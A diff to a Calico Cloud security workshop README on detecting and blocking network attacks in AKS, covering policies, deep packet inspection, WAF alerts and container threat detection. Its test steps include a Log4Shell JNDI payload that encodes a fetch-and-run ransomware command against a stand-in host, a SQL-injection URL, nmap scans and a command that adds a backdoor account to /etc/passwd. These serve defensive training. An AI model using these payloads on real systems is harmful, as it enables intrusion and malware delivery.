@@ -29,8 +29,8 @@ Configure Calico parameters for this workshop, and install and configure demo ap
 1. Clone this repository and change directory to it.
    
    ```bash
-   git clone https://github.com/tigera-solutions/cc-aks-security-compliance-workshop.git && \
-   cd cc-aks-security-compliance-workshop
+   git clone https://github.com/tigera-solutions/cc-aks-detect-block-network-attacks.git && \
+   cd cc-aks-detect-block-network-attacks
    ```
 
 2. Apply the yamls in the `pre` directory. Those yamls will setup the context for this workshop.
@@ -39,7 +39,202 @@ Configure Calico parameters for this workshop, and install and configure demo ap
    kubectl apply -f pre
    ```
 
+Included in the `pre` folder are two applications that will be used for the exercises in this workshop. The diagram below shows how the elements of each application communicate between themselves.
+
+<<< IMAGE HERE >>>
+
+There are also other objects that will be created for the workshop. We will lear about them later in the workshop.
+
 ---
+
+## Review and customize security guardrails for network-based threats
+
+There are some tools in Calico Cloud that will help to prevent and mitigate network-based attacks. Let's start with security policies creating microsegmentation to mitigate zero day attacks.
+
+Go to the Policies Board and review the policies created
+
+Review the policies 
+
+- Talk about the DNS policy in the security tier
+
+Create policies for the vote application
+- create the default-deny staged
+- create a policy for db manually
+- create all other policies using recommend policy.
+
+Test access from redis to nginx-svc (wget)
+
+- enforce default-deny
+
+Test again.
+
+Now its your time! Create the policies for the wordpress application.
+
+- create a default-deny-wordpress staged for the wordpress namespace.
+- create a tier for the wordpress.
+- create the policies
+- change the main default-deny 
+- delete the default-deny-wordpress staged
+
+### Configure IDS/IPS, workload-centric WAF, and DDoS protection
+
+- configure IDS/IPS for vote service
+
+First enable the Intrusion Detection
+
+kubectl apply -f - <<-EOF
+apiVersion: operator.tigera.io/v1
+kind: IntrusionDetection
+metadata:
+  name: tigera-secure
+spec:
+  componentResources:
+  - componentName: DeepPacketInspection
+    resourceRequirements:
+      limits:
+        cpu: "1"
+        memory: 1Gi
+      requests:
+        cpu: 100m
+        memory: 100Mi
+EOF
+
+- then, create a deep packet inspection for the vote application in the vote namespace.
+
+kubectl apply -f - <<-EOF
+apiVersion: projectcalico.org/v3
+kind: DeepPacketInspection
+metadata:
+  name: dpi-ids-vote
+  namespace: vote
+spec:
+  selector: app in {'vote'}
+EOF
+
+- test with 
+
+k get svc -n vote 
+
+curl -m2 http://xx.xxx.xx.xx./cmd.exe
+curl -m2 http://xx.xx.xx.xx/NessusTest
+
+See the results in service graph
+
+- protect the result app
+
+k edit -n vote deepacketinspection dpi-ids-vote
+
+  selector: app in {'vote', 'result'}
+
+- test with 
+
+k get svc -n vote 
+
+curl -m2 http://xx.xxx.xx.xx./cmd.exe
+curl -m2 http://xx.xx.xx.xx/NessusTest
+
+See the results in service graph
+
+Now its your time do the same to protect your wordpress application.
+
+You dont need to create another IntrusionDetection, just a DPI in the wordpress namespace targeting the wordpress application.
+
+- test with 
+
+k get svc -n vote 
+
+curl -m2 http://xx.xxx.xx.xx./cmd.exe
+curl -m2 http://xx.xx.xx.xx/NessusTest
+
+See the results in service graph
+
+kubectl apply -f - <<-EOF
+apiVersion: projectcalico.org/v3
+kind: DeepPacketInspection
+metadata:
+  name: dpi-ids-wordpress
+  namespace: wordpress
+spec:
+  selector: app == "wordpress"
+EOF
+
+--------------------------------
+--- WAF
+--------------------------------
+
+kubectl patch felixconfiguration default --type='merge' -p '{"spec":{"policySyncPathPrefix":"/var/run/nodeagent"}}'
+
+kubectl -n tigera-runtime-security annotate daemonset runtime-reporter unsupported.operator.tigera.io/ignore="true"
+kubectl -n tigera-runtime-security get daemonset.apps/runtime-reporter -o yaml | sed 's/15m/1m/g' | kubectl apply -f -
+
+
+kubectl apply -f - <<-EOF
+apiVersion: projectcalico.org/v3
+kind: GlobalAlert
+metadata:
+  name: waf-new-alert-rule-info
+spec:
+  summary: 'WAF new waf-alert-942100'
+  description: 'Test WAF Global Alert'
+  severity: 1
+  dataSet: waf
+  period: 1m
+  lookback: 1h
+  query: '"rule_info" IN {"*942100*"}'
+  threshold: 0
+  condition: gt
+EOF
+
+
+curl -v -H \
+  'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
+  'wordpress.wordpress'
+
+
+  curl http://wordpress.wordpress//test/artists.php?artist=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+
+
+############################################
+### Detect zero-day attacks based on suspicious container activity using syscalls, file access, and process information 
+############################################
+
+Threat Defence > Container Threat Detection - enable
+
+k run attacker --image ubuntu -- sleep infinity
+k exec attacker -it -- /bin/bash
+
+apt update
+apt-get install nmap
+nmap -sn $(hostname -i)/24
+nmap -T4 -F $(hostname -i)/24
+
+echo hacker:x:777:0:hacker:/tmp:/bin/bash >> /etc/passwd
+passwd hacker
+
+
+############################################
+### Preview and enforce security policies to quarantine infected workloads
+############################################
+
+k label pod attacker quarantine="true"
+
+curl neverssl.com
+curl wordpress.wordpress
+curl 
+
+k label pod attacker quarantine-
+
+############################################
+### Visualize security posture of your Kubernetes cluster 
+############################################
+
+- Activity > Timeline
+- Compliance reports
+  - CIS Benchmark
+  - Inventory
+  - Network Access
+  - Policy Audit
+
 
 # How Calico supports compliance requirements
 
